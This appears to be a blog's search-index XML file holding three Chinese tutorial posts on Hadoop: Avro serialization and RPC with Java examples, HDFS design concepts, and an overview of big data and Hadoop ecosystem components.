<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Avro简介]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F4.%20Avro%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Avro简介一、引言1、 简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro是Hadoop中的一个子项目，也是Apache中一个独立的项目，Avro是一个基于二进制数据传输高性能的中间件。在Hadoop的其他项目中例如HBase(Ref)和Hive(Ref)的Client端与服务端的数据传输也采用了这个工具。Avro是一个数据序列化的系统。Avro 可以将数据结构或对象转化成便于存储或传输的格式。Avro设计之初就用来支持数据密集型应用，适合于远程或本地大规模数据的存储和交换。 2、 特点 丰富的数据结构类型； 快速可压缩的二进制数据形式，对数据二进制序列化后可以节约数据存储空间和网络传输带宽； 存储持久数据的文件容器； 可以实现远程过程调用RPC； 简单的动态语言结合功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;avro支持跨编程语言实现（C, C++, C#，Java, Python, Ruby, PHP），类似于Thrift，但是avro的显著特征是：avro依赖于模式，动态加载相关数据的模式，Avro数据的读写操作很频繁，而这些操作使用的都是模式，这样就减少写入每个数据文件的开销，使得序列化快速而又轻巧。这种数据及其模式的自我描述方便了动态脚本语言的使用。当Avro数据存储到文件中时，它的模式也随之存储，这样任何程序都可以对文件进行处理。如果读取数据时使用的模式与写入数据时使用的模式不同，也很容易解决，因为读取和写入的模式都是已知的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro和动态语言结合后，读/写数据文件和使用RPC协议都不需要生成代码，而代码生成作为一种可选的优化只需要在静态类型语言中实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro依赖于模式(Schema)。通过模式定义各种数据结构，只有确定了模式才能对数据进行解释，所以在数据的序列化和反序列化之前，必须先确定模式的结构。正是模式的引入，使得数据具有了自描述的功能，同时能够实现动态加载，另外与其他的数据序列化系统如Thrift相比，数据之间不存在其他的任何标识，有利于提高数据处理的效率。 二、技术要领1、类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据类型标准化的意义：一方面使不同系统对相同的数据能够正确解析，另一方面，数据类型的标准定义有利于数据序列化/反序列化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单的数据类型：Avro定义了几种简单数据类型，下表是其简单说明： 类型 说明 null no value boolean a binary value int 32-bit signed integer long 64-bit signed integer float single precision (32-bit) IEEE 754 floating-point number double double precision (64-bit) IEEE 754 floating-point number bytes sequence of 8-bit unsigned bytes string unicode character sequence &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;简单数据类型由类型名称定义，不包含属性信息，例如字符串定义如下： {“type”: “string”} &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复杂数据类型：Avro定义了六种复杂数据类型，每一种复杂数据类型都具有独特的属性，下表就每一种复杂数据类型进行说明。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一种复杂数据类型都含有各自的一些属性，其中部分属性是必需的，部分是可选的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里需要说明Record类型中field属性的默认值，当Record Schema实例数据中某个field属性没有提供实例数据时，则由默认值提供，具体值见下表。Union的field默认值由Union定义中的第一个Schema决定。 avro type json type example null null null boolean boolean true int,long integer 1 float,double number 1.1 bytes string “\u00FF” string string “foo” record object {“a”: 1} enum string “FOO” array array [1] map object {“a”: 1} fixed string “\u00ff” 2、序列化/反序列化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro指定两种数据序列化编码方式：binary encoding 和Json encoding。使用二进制编码会高效序列化，并且序列化后得到的结果会比较小；而JSON一般用于调试系统或是基于WEB的应用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;binary encoding规则如下： 简单数据类型 Type Encoding Example null Zero bytes Null boolean A single byte {true:1, false:0} int/long variable-length zig-zag coding &#160; float 4 bytes Java’s floatToIntBits double 8 bytes Java’s doubleToLongBits bytes a long followed by that many bytes of data &#160; string a long followed by that many bytes of UTF-8 encoded character data “foo”:{3,f,o,o} 06 66 6f 6f 复杂数据类型 Type encoding Records encoded just the concatenation of the encodings of its fields Enums a int representing the zero-based position of the symbol in the schema Arrays encoded as series of blocks. A block with count 0 indicates the end of the array. block:{long,items} Maps encoded as series of blocks. A block with count 0 indicates the end of the map. block:{long,key/value pairs}. Unions encoded by first writing a long value indicating the zero-based position within the union of the schema of its value. The value is then encoded per the indicated schema within the union. fixed encoded using number of bytes declared in the schema &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实例： records 12345678&#123;"type":"record","name":"test","fields" : [&#123;"name": "a","type": "long"&#125;,&#123;"name": "b","type": "string"&#125;]&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设：a=27b=”foo” (encoding：36(27), 06(3), 66(“f”), 6f(“o”)) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;binary encoding：3606 66 6f 6f enums 123&#123;"type": "enum","name": "Foo", "symbols": ["A","B", "C", "D"] &#125;“D”(encoding: 06(3))binary encoding: 06 arrays 1&#123;"type": "array","items": "long"&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设：{3, 27 } (encoding：04(2), 06(3), 36(27) ) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;binary encoding：0406 36 00 maps &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设：{(“a”:1), (“b”:2) } （encoding：61(“a”), 62(“b”), 02(1), 04(2)） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;binary encoding：0261 02 02 62 04 unions 1["string","null"] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设：(1)null; (2) “a”binary encoding： (1) 02；说明：02代表null在union定义中的位置1； (2) 00 02 61；说明：00为string在union定义的位置，02 61为”a”的编码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图1表示的是Avro本地序列化和反序列化的实例，它将用户定义的模式和具体的数据编码成二进制序列存储在对象容器文件中，例如用户定义了包含学号、姓名、院系和电话的学生模式，而Avro对其进行编码后存储在student.db文件中，其中存储数据的模式放在文件头的元数据中，这样读取的模式即使与写入的模式不同，也可以迅速地读出数据。假如另一个程序需要获取学生的姓名和电话，只需要定义包含姓名和电话的学生模式，然后用此模式去读取容器文件中的数据即可。 3、模式Schema&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Schema通过JSON对象表示。Schema定义了简单数据类型和复杂数据类型，其中复杂数据类型包含不同属性。通过各种数据类型用户可以自定义丰富的数据结构。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Schema由下列JSON对象之一定义： JSON字符串：命名 JSON对象：{“type”: “typeName” …attributes…} JSON数组：Avro中Union的定义 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例： 123456789&#123;"namespace": "example.avro", "type":"record", "name":"User", "fields": [ &#123;"name":"name", "type": "string"&#125;, &#123;"name":"favorite_number", "type": ["int", "null"]&#125;, &#123;"name":"favorite_color", "type": ["string","null"]&#125; ]&#125; 4、排序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro为数据定义了一个标准的排列顺序。比较在很多时候是经常被使用到的对象之间的操作，标准定义可以进行方便有效的比较和排序。同时标准的定义可以方便对Avro的二进制编码数据直接进行排序而不需要反序列化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有当数据项包含相同的Schema的时候，数据之间的比较才有意义。数据的比较按照Schema深度优先，从左至右的顺序递归的进行。找到第一个不匹配即可终止比较。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两个拥有相同的模式的项的比较按照以下规则进行： null：总是相等。 int,long,float：按照数值大小比较。 boolean：false在true之前。 string：按照字典序进行比较。 bytes，fixed：按照byte的字典序进行比较。 array：按照元素的字典序进行比较。 enum：按照符号在枚举中的位置比较。 record：按照域的字典序排序，如果指定了以下属性： “ascending”，域值的顺序不变。 “descending”，域值的顺序颠倒。 “ignore”，排序的时候忽略域值。 map：不可进行比较。 5、对象容器文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro定义了一个简单的对象容器文件格式。一个文件对应一个模式，所有存储在文件中的对象都是根据模式写入的。对象按照块进行存储，块可以采用压缩的方式存储。为了在进行mapreduce处理的时候有效的切分文件，在块之间采用了同步记号。一个文件可以包含任意用户定义的元数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个文件由两部分组成：文件头和一个或者多个文件数据块。 文件头： 四个字节，ASCII‘O’，‘b’，‘j’,1。 文件元数据，用于描述Schema。 16字节的文件同步记号。 其中，文件元数据的格式为： i. 值为-1的长整型，表明这是一个元数据块。 ii. 标识块长度的长整型。 iii. 标识块中key/value对数目的长整型。 iv. 每一个key/value对的string key和bytesvalue。 v. 标识块中字节总数的4字节长的整数。 文件数据块：数据是以块结构进行组织的，一个文件可以包含一个或者多个文件数据块。 表示文件中块中对象数目的长整型。 表示块中数据序列化后的字节数长度的长整型。 序列化的对象。 16字节的文件同步记号。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当数据块的长度为0时即为文件数据块的最后一个数据，此后的所有数据被自动忽略。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下图示对象容器文件的结构分解及说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个存储文件由两部分组成:头信息(Header)和数据块(Data Block)。而头信息又由三部分构成：四个字节的前缀，文件Meta-data信息和随机生成的16字节同步标记符。Avro目前支持的Meta-data有两种：schema和codec。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;codec表示对后面的文件数据块(File Data Block)采用何种压缩方式。Avro的实现都需要支持下面两种压缩方式：null(不压缩)和deflate(使用Deflate算法压缩数据块)。除了文档中认定的两种Meta-data，用户还可以自定义适用于自己的Meta-data。这里用long型来表示有多少个Meta-data数据对，也是让用户在实际应用中可以定义足够的Meta-data信息。对于每对Meta-data信息，都有一个string型的key(需要以“avro.” 为前缀)和二进制编码后的value。对于文件中头信息之后的每个数据块，有这样的结构：一个long值记录当前块有多少个对象，一个long值用于记录当前块经过压缩后的字节数，真正的序列化对象和16字节长度的同步标记符。由于对象可以组织成不同的块，使用时就可以不经过反序列化而对某个数据块进行操作。还可以由数据块数，对象数和同步标记符来定位损坏的块以确保数据完整性。 三、RPC实现&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当在RPC中使用Avro时，服务器和客户端可以在握手连接时交换模式。服务器和客户端有彼此全部的模式，因此相同命名字段、缺失字段和多余字段等信息之间通信中需要处理的一致性问题就可以容易解决。如图2所示，协议中定义了用于传输的消息，消息使用框架后放入缓冲区中进行传输，由于传输的初始就交换了各自的协议定义，因此即使传输双方使用的协议不同所传输的数据也能够正确解析。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro作为RPC框架来使用。客户端希望同服务器端交互时，就需要交换双方通信的协议，它类似于模式，需要双方来定义，在Avro中被称为消息(Message)。通信双方都必须保持这种协议，以便于解析从对方发送过来的数据，这也就是传说中的握手阶段。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;消息从客户端发送到服务器端需要经过传输层(Transport Layer)，它发送消息并接收服务器端的响应。到达传输层的数据就是二进制数据。通常以HTTP作为传输模型，数据以POST方式发送到对方去。在 Avro中，它的消息被封装成为一组缓冲区(Buffer)，类似于下图的模型： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如上图，每个缓冲区以四个字节开头，中间是多个字节的缓冲数据，最后以一个空缓冲区结尾。这种机制的好处在于，发送端在发送数据时可以很方便地组装不同数据源的数据，接收方也可以将数据存入不同的存储区。还有，当往缓冲区中写数据时，大对象可以独占一个缓冲区，而不是与其它小对象混合存放，便于接收方方便地读取大对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对象容器文件是Avro的数据存储的具体实现，数据交换则由RPC服务提供，与对象容器文件类似，数据交换也完全依赖Schema，所以与Hadoop目前的RPC不同，Avro在数据交换之前需要通过握手过程先交换Schema。 1、握手过程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;握手的过程是确保Server和Client获得对方的Schema定义，从而使Server能够正确反序列化请求信息，Client能够正确反序列化响应信息。一般的，Server/Client会缓存最近使用到的一些协议格式，所以，大多数情况下，握手过程不需要交换整个Schema文本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有的RPC请求和响应处理都建立在已经完成握手的基础上。对于无状态的连接，所有的请求响应之前都附有一次握手过程；对于有状态的连接，一次握手完成，整个连接的生命期内都有效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体过程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Client发起HandshakeRequest，其中含有Client本身SchemaHash值和对应Server端的Schema Hash值(clientHash!=null,clientProtocol=null, serverHash!=null)。如果本地缓存有serverHash值则直接填充，如果没有则通过猜测填充。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Server用如下之一HandshakeResponse响应Client请求： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(match=BOTH, serverProtocol=null,serverHash=null)：当Client发送正确的serverHash值且Server缓存相应的clientHash。握手过程完成，之后的数据交换都遵守本次握手结果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(match=CLIENT, serverProtocol!=null,serverHash!=null)：当Server缓存有Client的Schema，但是Client请求中ServerHash值不正确。此时Server发送Server端的Schema数据和相应的Hash值，此次握手完成，之后的数据交换都遵守本次握手结果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(match=NONE)：当Client发送的ServerHash不正确且Server端没有Client Schema的缓存。这种情况下Client需要重新提交请求信息 (clientHash!=null,clientProtocol!=null, serverHash!=null)，Server响应 (match=BOTH, serverProtocol=null,serverHash=null)，此次握手过程完成，之后的数据交换都遵守本次握手结果。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;握手过程使用的Schema结构如下示。 123456789101112131415161718192021&#123;"type":"record","name":"HandshakeRequest","namespace":"org.apache.avro.ipc","fields":[&#123;"name":"clientHash", "type": &#123;"type": "fixed","name": "MD5", "size": 16&#125;&#125;,&#123;"name":"clientProtocol", "type": ["null","string"]&#125;,&#123;"name":"serverHash", "type": "MD5"&#125;,&#123;"name":"meta", "type": ["null", &#123;"type":"map", "values": "bytes"&#125;]&#125;]&#125;&#123;"type":"record","name":"HandshakeResponse", "namespace":"org.apache.avro.ipc","fields":[&#123;"name":"match","type": &#123;"type": "enum","name": "HandshakeMatch","symbols":["BOTH", "CLIENT", "NONE"]&#125;&#125;,&#123;"name":"serverProtocol", "type": ["null","string"]&#125;,&#123;"name":"serverHash","type": ["null", &#123;"type":"fixed", "name": "MD5", "size": 16&#125;]&#125;,&#123;"name":"meta","type": ["null", &#123;"type":"map", "values": "bytes"&#125;]&#125;]&#125; 2、消息帧格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;消息从客户端发送到服务器端需要经过传输层，它发送请求并接收服务器端的响应。到达传输层的数据就是二进制数据。通常以HTTP作为传输模型，数据以POST方式发送到对方去。在 Avro中消息首先分帧后被封装成为一组缓冲区(Buffer)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据帧的格式如下： 一系列Buffer： 4字节的Buffer长度 Buffer字节数据 长度为0的Buffer结束数据帧 3、Call格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个调用由请求消息、结果响应消息或者错误消息组成。请求和响应包含可扩展的元数据，两种消息都按照之前提出的方法分帧。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;调用的请求格式为： 请求元数据，一个类型值的映射。 消息名，一个Avro字符串。 消息参数。参数根据消息的请求定义序列化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;调用的响应格式为： 响应的元数据，一个类型值的映射。 一字节的错误标志位。 如果错误标志为false，响应消息，根据响应的模式序列化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果错误标志位true，错误消息，根据消息的错误联合模式序列化。 四、实例1、本地序列化/反序列化1234567891011121314151617181920212223242526272829303132333435363738394041424344454647user.avsc&#123;"namespace":"example.avro", "type": "record", "name": "User", "fields": [ &#123;"name": "name", "type":"string"&#125;, &#123;"name": "favorite_number", "type": ["int", "null"]&#125;, &#123;"name": "favorite_color", "type":["string", "null"]&#125; ]&#125;Main.javapublic class Main &#123; public static void main(String[] args)throws Exception &#123; User user1 = new User(); user1.setName("Alyssa"); user1.setFavoriteNumber(256); // Leave favorite color null // Alternate constructor User user2 = new User("Ben", 7,"red"); // Construct via builder User user3 = User.newBuilder() .setName("Charlie") .setFavoriteColor("blue") .setFavoriteNumber(null) .build(); // Serialize user1 and user2to disk File file = new File("users.avro"); DatumWriter&lt;User&gt; userDatumWriter = new SpecificDatumWriter&lt;User&gt;(User.class); DataFileWriter&lt;User&gt; dataFileWriter = newDataFileWriter&lt;User&gt;(userDatumWriter); dataFileWriter.create(user1.getSchema(),new File("users.avro")); dataFileWriter.append(user1); dataFileWriter.append(user2); dataFileWriter.append(user3); dataFileWriter.close(); // Deserialize Usersfrom disk DatumReader&lt;User&gt; userDatumReader = newSpecificDatumReader&lt;User&gt;(User.class); DataFileReader&lt;User&gt; dataFileReader = newDataFileReader&lt;User&gt;(file, userDatumReader); User user = null; while (dataFileReader.hasNext()) &#123; // Reuse user object bypassing it to next(). This saves us from // allocating and garbagecollecting many objects for files with // many items. user = dataFileReader.next(user); System.out.println(user); &#125; &#125;&#125; 2、RPC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556mail.avsc&#123;"namespace":"example.proto", "protocol": "Mail", "types": [ &#123;"name": "Message", "type":"record", "fields": [ &#123;"name": "to", "type": "string"&#125;, &#123;"name": "from", "type": "string"&#125;, &#123;"name": "body", "type":"string"&#125; ] &#125; ], "messages": &#123; "send": &#123; "request": [&#123;"name": "message","type": "Message"&#125;], "response": "string" &#125; &#125;&#125;Main.javapublic class Main &#123; public static class MailImpl implements Mail &#123; // in this simple example just return details of the message public Utf8 send(Message message) &#123; System.out.println("Sending message"); return new Utf8("Sending message to " + message.getTo().toString() + " from " +message.getFrom().toString() + " with body " +message.getBody().toString()); &#125; &#125; private static Server server; private static void startServer() throws IOException &#123; server = new NettyServer(new SpecificResponder(Mail.class,new MailImpl()),newInetSocketAddress(65111)); // the server implements the Mail protocol (MailImpl) &#125; public static void main(String[] args)throws IOException &#123; System.out.println("Starting server"); // usually this would be anotherapp, but for simplicity startServer(); System.out.println("Server started"); NettyTransceiver client = new NettyTransceiver(new InetSocketAddress(65111)); // client code - attach to the server and send a message Mail proxy = (Mail) SpecificRequestor.getClient(Mail.class, client); System.out.println("Client built, got proxy"); // fill in the Message record and send it Message message = new Message(); message.setTo(new Utf8("127.0.0.1")); message.setFrom(new Utf8("127.0.0.1")); message.setBody(new Utf8("this is my message")); System.out.println("Calling proxy.send with message: " + message.toString()); System.out.println("Result: " +proxy.send(message)); // cleanup client.close(); server.close(); &#125;&#125;]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HDFS原理分析—— 基本概念]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F6.%20HDFS%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%20%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[HDFS原理分析—— 基本概念&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS是Hadoop Distribute File System 的简称，也就是Hadoop的一个分布式文件系统。 一、HDFS的主要设计理念1、存储超大文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的“超大文件”是指几百MB、GB甚至TB级别的文件。 2、最高效的访问模式是 一次写入、多次读取(流式数据访问)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS存储的数据集作为hadoop的分析对象。在数据集生成后，长时间在此数据集上进行各种分析。每次分析都将设计该数据集的大部分数据甚至全部数据，因此读取整个数据集的时间延迟比读取第一条记录的时间延迟更重要。 3、运行在普通廉价的服务器上&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS设计理念之一就是让它能运行在普通的硬件之上，即便硬件出现故障，也可以通过容错策略来保证数据的高可用。 二、HDFS的忌讳1、将HDFS用于对数据访问要求低延迟的场景&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于HDFS是为高数据吞吐量应用而设计的，必然以高延迟为代价。 2、存储大量小文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS中元数据（文件的基本信息）存储在namenode的内存中，而namenode为单点，小文件数量大到一定程度，namenode内存就吃不消了。 三、HDFS基本概念&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据块（block）：大文件会被分割成多个block进行存储，block大小默认为64MB。每一个block会在多个datanode上存储多份副本，默认是3份。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;namenode：namenode负责管理文件目录、文件和block的对应关系以及block和datanode的对应关系。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;datanode：datanode就负责存储了，当然大部分容错机制都是在datanode上实现的。 四、HDFS基本架构图 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图中有几个概念需要介绍一下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Rack 是指机柜的意思，一个block的三个副本通常会保存到两个或者两个以上的机柜中（当然是机柜中的服务器），这样做的目的是做防灾容错，因为发生一个机柜掉电或者一个机柜的交换机挂了的概率还是蛮高的。 五、HDFS写文件流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;思考： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在datanode执行create file后，namenode采用什么策略给client分配datanode？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顺序写入三个datanode，写入过程中有一个datanode挂掉了，如何容错？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;client往datanode写入数据时挂掉了，怎么容错？ 六、HDFS读文件流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;思考：namenode挂掉了怎么办，这个时候HDFS是否有相应的容错方案。]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop 大数据]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F1.%20Hadoop%20%E5%A4%A7%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[Hadoop 大数据1.大数据介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大数据指的是所涉及的数据量规模巨大到无法通过人工，在合理时间内达到截取、管理、处理、并整理成为人类所能解读的形式的信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;大数据，可帮助我们察觉商业趋势、判定研究质量、避免疾病扩散、打击犯罪或测定即时交通路况等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;麦肯锡全球研究院（MGI）预测，到 2020年，全球数据使用量预计将达到 35ZB（1ZB=1000EB，1EB=1000PB，1PB=1000TB，1TB=1000GB）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Google每天要处理的数据高达几百PB。百度每天处理数据几十PB。腾讯微信活跃用户数达7亿，每天产生的数据量上百TB，2016年除夕当日，微信红包的参与人数达到4.2亿人，收发总量达80.8亿个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多源异构：描述同一主题的数据由不同的用户、不同的网站产生。网络数据有多种不同的呈现形式，如音视频、图片、文本等，导致网络数据格式上的异构性。 交互性：不同于测量和传感获取的大规模科学数据，微博等社交网络兴起导至大量网络数据具有很强的交互性。 时效性：在网络平台上，每时每刻都有大量新的网络数据发布，网络信息内容不断变化，导致了信息传播的时序相关性。 社会性：网络上用户根据自己的需要和喜好发布、回复或转发信息，因而网络数据成了对社会状态的直接反映。 突发性：有些信息在传播过程中会在短时间内引起大量新的网络数据与信息的产生，并使相关的网络用户形成网络群体，体现出网络大数据以及网络群体的突发特性。 高噪声：网络数据来自于众多不同的网络用户，具有很高的噪声。 2.Hadoop 介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hadoop是一个开源分布式计算平台框架，基于apache协议发布，由java语言开发。http://hadoop.apache.org/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hadoop两大核心组件：HDFS（分布式文件系统，为分布式计算提供了数据存储）和mapreduce（应用程序被分区成许多小部分，而每个部分都能在集群中的任意节点上运行，一句话就是任务的分解和结果的汇总） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外两个模块：Common、YARN &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其他和hadoop相关的项目：Ambari、Avro、Cassandra、Chukwa、Hbase、Hive、Mahout、Pig、Spark、Tez、Zookeeper &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hadoop支持由廉价的计算机搭建集群，有强大的冗余机制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;hadoop在各大互联网企业中应用广泛，百度使用hadoop进行搜索日志的分析和网页数据的挖掘工作；淘宝使用hadoop存储并处理电子商务交易相关数据；facebook使用hadoop进行数据分析和机器学习。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有哪些企业在使用hadoop http://wiki.apache.org/hadoop/PoweredBy 3.Hadoop组件以及相关项目介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Common：为其他组件提供常用工具支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;YARN：作业调度和集群管理的框架。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;*Ambari: 是 Apache Software Foundation 中的一个项目。就 Ambari 的作用来说，就是创建、管理、监视 Hadoop 的集群，但是这里的 Hadoop 是广义，指的是 Hadoop 整个生态圈（例如 Hive，Hbase，Sqoop，Zookeeper 等）。用一句话来说，Ambari 就是为了让 Hadoop 以及相关的大数据软件更容易使用的一个工具。Ambari——大数据平台的搭建利器 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Avro：Avro是Hadoop中的一个子项目，也是Apache中一个独立的项目，Avro是一个基于二进制数据传输高性能的中间件。在Hadoop的其他项目中例如HBase(Ref)和Hive(Ref)的Client端与服务端的数据传输也采用了这个工具。Avro是一个数据序列化的系统。Avro 可以将数据结构或对象转化成便于存储或传输的格式。Avro设计之初就用来支持数据密集型应用，适合于远程或本地大规模数据的存储和交换。Avro简介 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Cassandra：可扩展的多主数据库，不存在单点故障。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Chukwa：是数据收集系统，用于监控和分析大型分布式系统的数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HBase：是一个分布式面向列的数据库。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Hive：最早由facebook设计，是建立在hadoop基础之上的数据仓库，它提供了一些用于数据整理、特殊查询和分析在hadoop文件中数据集工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Mahout：可扩展的机器学习和数据挖掘库。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Pig：是一种高级语言和并行计算可执行框架，它是一个对大型数据集分析和评估的平台。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spark：一个快速和通用计算的Hadoop数据引擎。和mapreduce类似，但是要比mapreduce快。它提供了一个简单而丰富的编程模型，支持多种应用，包括ETL、机器学习、数据流处理、图形计算。 参考文档 2分钟读懂Hadoop和Spark的异同 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Tez：是Apache最新的支持DAG作业的开源计算框架，它可以将多个有依赖的作业转换为一个作业从而大幅提升DAG作业的性能。Tez并不直接面向最终用户，事实上它允许开发者为最终用户构建性能更快、扩展性更好的应用程序。Hadoop传统上是一个大量数据批处理平台。但是，有很多用例需要近乎实时的查询处理性能。还有一些工作则不太适合MapReduce，例如机器学习。Tez的目的就是帮助Hadoop处理这些用例场景。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ZooKeeper：ZooKeeper是一组工具，用来配置和支持分布式调度。一个重要功能就是对所有节点进行配置的同步。它能处理分布式应用的“部分失败”问题。部分失败是分布式处理系统的固有特征，即发送者无法知道接收者是否收到消息，它的出现可能和网络传输问题、接收进程意外死掉等有关系。ZooKeeper是Hadoop生态系统的一部分，但又远不止如此，它能支持更多类似的分布式平台和系统，如Jubatus，Cassender等等。而且HBase明确指出至少需要一个ZooKeeper实例的支持。 4.HDFS 介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS设计思想来源于Google的GFS，是GFS的开源实现。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS要解决的问题 存储超大文件，比如TB级别 防止文件丢失 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS的特点 可以存储超大文件 只允许对一个已经打开的文件顺序写入，还可以在现有文件的末尾追加。要想修改一个文件（追加内容除外），只能删除后再重写 可以使用廉价的硬件平台搭建，通过容错策略来保证数据的高可用，默认存储3份数据，任何一份丢失可以自动恢复 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS的缺点 数据访问延迟比较高，因为它的设计场景是用于大吞吐量数据，HDFS是单master，所有文件都要经过它，当请求数据量很大时，延迟就增加了 文件数受限，和NameNode有关系 不支持多用户写入，也不支持文件任意修改 HDFS 架构 HDFS的几个核心概念&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据块（block）：大文件会被分割成多个block进行存储，block大小默认为64MB。每一个block会在多个datanode上存储多份副本，默认是3份。 